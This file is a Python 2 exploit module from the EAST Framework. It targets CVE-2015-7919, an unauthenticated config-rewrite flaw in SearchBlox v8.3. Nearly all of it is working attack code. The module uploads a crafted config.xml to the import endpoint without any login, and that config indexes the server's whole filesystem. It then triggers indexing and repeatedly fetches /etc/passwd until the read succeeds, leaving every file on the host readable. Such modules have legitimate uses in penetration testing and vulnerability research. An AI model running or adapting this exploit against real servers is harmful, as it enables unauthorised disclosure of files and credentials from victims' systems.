#! /usr/bin/env python
# -*- coding: utf_8 -*-
# The exploit is a part of EAST Framework - use only under the license agreement specified in LICENSE.txt in your EAST Framework distribution

import sys
import time
import urllib2

sys.path.append("./core")
from Sploit import Sploit

INFO = {}
INFO['NAME'] = "efs_searchblox_dt"
INFO['DESCRIPTION'] = "SearchBlox v8.3 Unauthenticated Config Rewrite Vulnerability"
INFO['VENDOR'] = "http://www.searchblox.com/downloads"
INFO['DOWNLOAD_LINK'] = ''
INFO['LINKS'] = 'https://ics-cert.us-cert.gov/advisories/ICSA-15-337-01'
INFO["CVE Name"] = "CVE-2015-7919"
INFO["NOTES"] = """
The affected product, SearchBlox, is a web-based proprietary search engine. According to SearchBlox, it is deployed across several sectors including Commercial Facilities, Critical Manufacturing, and Information Technology. SearchBlox estimates that these products are used in 30 countries including the United States and Europe.

The config file can be overwritten without admin login. This could allow the attacker to index all files on victim machine, and arbitrary access them.

Tested on SearchBlox v8.3 vmware image. Please, read comments in module file
"""

INFO['CHANGELOG'] = "25 Feb, 2016. Written by Gleg team."
INFO['PATH'] = 'Exploits/General/'

# Must be in every module, to be set by framework
OPTIONS = {}
OPTIONS["HOST"] = "127.0.0.1"
OPTIONS["PORT"] = 80
OPTIONS["SSL"] = False

class exploit(Sploit):
    def __init__(self, host = "", port = 0, logger = None):
        Sploit.__init__(self, logger = logger)
        self.name = INFO['NAME']
        self.host = host
        self.port = port
        self.ssl = False
        self.version = ''
        self.state = "running"
        return
    
    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get('HOST', self.host)
        self.port = int(self.args.get('PORT', self.port))
        self.ssl = bool(self.args.get('SSL', self.ssl))
        return
        
    def make_url(self, path = ''):
        return '{}{}:{}{}'.format(self.prot(), self.host, self.port, path)
        
    def prot(self):
        return self.ssl and 'https://' or 'http://'
        
    def make_xml_data(self):
        data = '--o0oOo0o\r\n'
        data += 'Content-Disposition: form-data; name="file"; filename="config.xml"\r\n'
        data += 'Content-Type: text/xml\r\n\r\n'

        data += '''<?xml version="1.0" encoding="UTF-8"?>
        <config><properties name="page-size" value="10"/><properties name="highlight" value="1"/><properties name="casesensitive" value="true"/><properties name="sort" value="relevance"/><properties name="searchform" value="1"/><template name="default.xsl" type="default"/><collection id="1" name="EaST" index="DISK" language="en" creationdate="1456317293987"><property name="ocr" value="false"/><property name="logging" value="NORMAL"/><property name="kwic" value="true"/><property name="spelling" value="true"/><property name="sb_boost" value="1"/><property name="stemming" value="false"/><property name="duplicates" value="false"/><scanner type="FILE"><property name="fast-max-thread" value="50"/><property name="max-size" value="-1"/><property name="max-age" value="-1"/><root url="/"/><url allow="true" pattern=".*"/><format type="EML"/><format type="MPEG"/><format type="WORD"/><format type="EXCEL"/><format type="PAGES"/><format type="FLV"/><format type="TAR"/><format type="MIDI"/><format type="GIF"/><format type="MPG"/><format type="VSD"/><format type="MSG"/><format type="RTF"/><format type="BMP"/><format type="MP4"/><format type="MP3"/><format type="TIFF"/><format type="NUMBERS"/><format type="PNG"/><format type="MID"/><format type="SVG"/><format type="JPG"/><format type="EPUB"/><format type="TAR.BZ2"/><format type="AIFF"/><format type="PPT"/><format type="WP"/><format type="PST"/><format type="TAR.GZ"/><format type="PDF"/><format type="WAV"/><format type="KEY"/><format type="XML"/><format type="TEXT"/><format type="HTML"><property name="description" value="META"/></format><format type="ZIP"/><format type="AIF"/><format type="ODF"/><format type="PSD"/><format type="DWG"/></scanner><schedule action="clear" frequency="HOURLY" timestamp=""/><schedule action="index" frequency="HOURLY" timestamp=""/><schedule action="refresh" frequency="HOURLY" timestamp=""/><schedule action="optimize" frequency="HOURLY" timestamp=""/></collection></config>'''
        data += '\r\n--o0oOo0o--\r\n'
        #You can change <root url="/"/> parametr from "/" to "C:/" to use it with windows based server
        return data
        
    def run(self):
        self.args()
        self.log("Attacking {}".format(self.host))
        
        config_xml = self.make_xml_data()
        request = urllib2.Request(self.make_url('/searchblox/servlet/UserServlet?action=importConfig'), config_xml)
        request.add_header('Content-Type', 'multipart/form-data; boundary=o0oOo0o')
        request.add_header('Content-Length', '%d' % len(config_xml))
        
        try:
            self.log('Upload config.xml file that makes Filesystem collection')
            
            fd = urllib2.urlopen(request)
            print fd.headers
            
            time.sleep(5)
            #if sever has collection, you must uncomment following request
            
            #fd = urllib2.urlopen(request)
            #print fd.headers
            
        except Exception, e:
            print e
        
        self.log('Waiting 5 seconds ...')
        time.sleep(5)

        request = urllib2.Request(self.make_url('/searchblox/servlet/IndexerServlet'), 'action=Index&id=1')
        request.add_header('Content-Length', '17')

        try:
            self.log('Start indexing files')
            fd = urllib2.urlopen(request)
            print fd.headers
        except Exception, e:
            print e
        
        self.log('Try to download /etc/passwd file with 30 seconds interval. It could takes a lot of time')
        while True:
            time.sleep(30)
            try:
                fd = urllib2.urlopen(self.make_url('/searchblox/servlet/FileServlet?url=%2Fetc%2Fpasswd&col=1'))
                self.log(fd.read())
                break
            except Exception, e:
                print e
        self.log('Now, you colud find any file at ' + self.make_url('/searchblox/plugin/index.html'))
        self.log("Finished this exploit")
        self.finish(True)
if __name__ == '__main__':
    """
        By now we only have the tool mode for exploit..
        Later we would have standalone mode also.
    """
    print "Running exploit %s .. " % INFO['NAME']
    e = exploit('', 80)
    e.run()
